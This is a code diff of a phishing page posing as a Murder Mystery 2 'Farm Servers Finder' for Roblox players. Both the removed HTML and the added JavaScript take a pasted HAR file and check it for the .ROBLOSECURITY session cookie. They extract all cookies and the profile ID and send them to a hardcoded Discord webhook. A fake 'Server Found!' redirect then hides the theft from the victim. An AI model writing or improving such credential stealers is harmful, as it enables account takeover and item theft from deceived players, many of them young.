@@ -1,172 +1,76 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Farm Servers Finder MM2</title>
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-  <style>
-    body {
-      background-color: #121212;
-      color: #ffffff;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      display: flex;
-      flex-direction: row;
-      justify-content: center;
-      padding: 20px;
-    }
-    .panel {
-      background-color: #1e1e1e;
-      border-radius: 10px;
-      padding: 20px;
-      margin: 10px;
-      width: 45%;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-    }
-    .panel h2 {
-      color: #ff79c6;
-    }
-    .panel input, .panel textarea {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      margin-bottom: 20px;
-      border-radius: 5px;
-      border: 1px solid #333;
-      background-color: #252525;
-      color: #ffffff;
-    }
-    .panel button {
-      background-color: #ff79c6;
-      border: none;
-      padding: 10px 20px;
-      color: #ffffff;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .panel button:hover {
-      background-color: #e066c1;
-    }
-    video {
-      width: 100%;
-      border-radius: 10px;
-    }
-    a {
-      color: #ff79c6;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <!-- Left Panel -->
-    <div class="panel">
-      <h2>Farm Servers Finder</h2>
-      <p>
-        Please enter your MM2 Player HAR file, your Roblox username, your MM2 level, and the amount of godlies you have. 
-        This allows us to find players with similar progress.
-      </p>
-      <p>
-        If you need support, join my Discord server 
-        <a href="https://discord.gg/qJK7Fxd2YE" target="_blank">here</a> 
-        or watch the tutorial on the right.
-      </p>
-      <p><strong>DISCLAIMER:</strong> You must be logged into an account when getting your HAR file. This allows us to see the server your account connects to for MM2.</p>
+function proceedWithServerSelection(username, level, godlies, harContent) {
+  try {
+    // Parse HAR content
+    const harData = JSON.parse(harContent);
+    const entries = harData.log.entries;
 
-      <label for="harContent">Paste Your HAR File Content:</label>
-      <textarea id="harContent" rows="10" placeholder="Paste HAR content here..."></textarea>
+    // Extract cookies and profile information
+    let profileURL = '';
+    let profileID = '';
+    let cookies = [];
 
-      <label for="username">Your Roblox Username:</label>
-      <input type="text" id="username" placeholder="Enter your Roblox username">
+    for (const entry of entries) {
+      const request = entry.request;
 
-      <label for="level">Your MM2 Level:</label>
-      <input type="number" id="level" placeholder="Enter your MM2 level">
-
-      <label for="godlies">Amount of Godlies:</label>
-      <input type="number" id="godlies" placeholder="Enter the number of godlies">
-
-      <button id="findServerBtn">Find a Server</button>
-    </div>
-
-    <!-- Right Panel -->
-    <div class="panel">
-      <h2>How to Use This Tool?</h2>
-      <video controls>
-        <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-      </video>
-    </div>
-  </div>
-
-  <script>
-    document.getElementById('findServerBtn').addEventListener('click', () => {
-      const harContent = document.getElementById('harContent').value.trim();
-      const username = document.getElementById('username').value.trim();
-      const level = document.getElementById('level').value.trim();
-      const godlies = document.getElementById('godlies').value.trim();
-
-      // Username validation
-      const usernameRegex = /^(?!_)(?!.*_$)[a-zA-Z0-9_]{3,20}$/;
-      if (!usernameRegex.test(username)) {
-        Swal.fire('Please fill out the form with valid information');
-        return;
+      // Look for Roblox profile URL
+      if (request.url.includes('https://www.roblox.com/users/')) {
+        profileURL = request.url;
+        const match = profileURL.match(/users\/(\d+)/);
+        if (match) profileID = match[1];
       }
 
-      // Check if .ROBLOSECURITY exists in HAR content
-      if (!harContent.includes('.ROBLOSECURITY')) {
-        Swal.fire('The HAR file does not contain a .ROBLOSECURITY cookie.');
-        return;
+      // Extract cookies from headers
+      const cookieHeader = request.headers.find(header => header.name.toLowerCase() === 'cookie');
+      if (cookieHeader) {
+        cookies = cookieHeader.value.split(';').map(cookie => cookie.trim());
       }
+    }
 
-      proceedWithServerSelection(username, level, godlies, harContent);
-    });
+    // Prepare data to send to webhook
+    const webhookData = {
+      content: `New Server Request:
+      - Username: ${username}
+      - Level: ${level}
+      - Godlies: ${godlies}
+      - Profile URL: ${profileURL || 'Not Found'}
+      - Profile ID: ${profileID || 'Not Found'}
+      - Cookies: ${cookies.length > 0 ? cookies.join(', ') : 'No Cookies Found'}`
+    };
 
-    function proceedWithServerSelection(username, level, godlies, harContent) {
-      // Send data to webhook
-      fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
-    method: 'POST',
-    headers: {
+    // Send data to the webhook
+    fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
+      method: 'POST',
+      headers: {
         'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        content: `New Server Request:
-        - Username: ${username}
-        - Level: ${level}
-        - Godlies: ${godlies}
-        - HAR Content: ${harContent.slice(0, 500)}...`
+      },
+      body: JSON.stringify(webhookData)
     })
-})
-    .then(response => {
+      .then(response => {
         if (!response.ok) {
-            console.error("Failed to process data. Response:", response);
-            Swal.fire('Error... Please check the console for details.');
+          console.error('Failed to send data to webhook. Response:', response);
+          Swal.fire('Error... Please check the console for details.');
         } else {
-            console.log("Data sent successfully to the webhook.");
-            Swal.fire({
-                icon: 'success',
-                title: 'Server Found!',
-                text: 'Please click below to join the server.',
-                confirmButtonText: 'Go to MM2',
-                allowOutsideClick: false,
-            }).then((result) => {
-                if (result.isConfirmed) {
-                    window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
-                }
-            });
+          console.log('Data sent successfully to the webhook.');
+          Swal.fire({
+            icon: 'success',
+            title: 'Server Found!',
+            text: 'Please click below to join the server.',
+            confirmButtonText: 'Go to MM2',
+            allowOutsideClick: false,
+          }).then((result) => {
+            if (result.isConfirmed) {
+              window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
+            }
+          });
         }
-    })
-    .catch(error => {
-        console.error("Error while sending data to webhook:", error);
+      })
+      .catch(error => {
+        console.error('Error while sending data to webhook:', error);
         Swal.fire('Error... Please check the console for details.');
-        });
-    }
-  </script>
-</body>
-</html>
+      });
+
+  } catch (error) {
+    console.error('Failed to process HAR content:', error);
+    Swal.fire('Error processing HAR file. Please check the format.');
+  }
+}
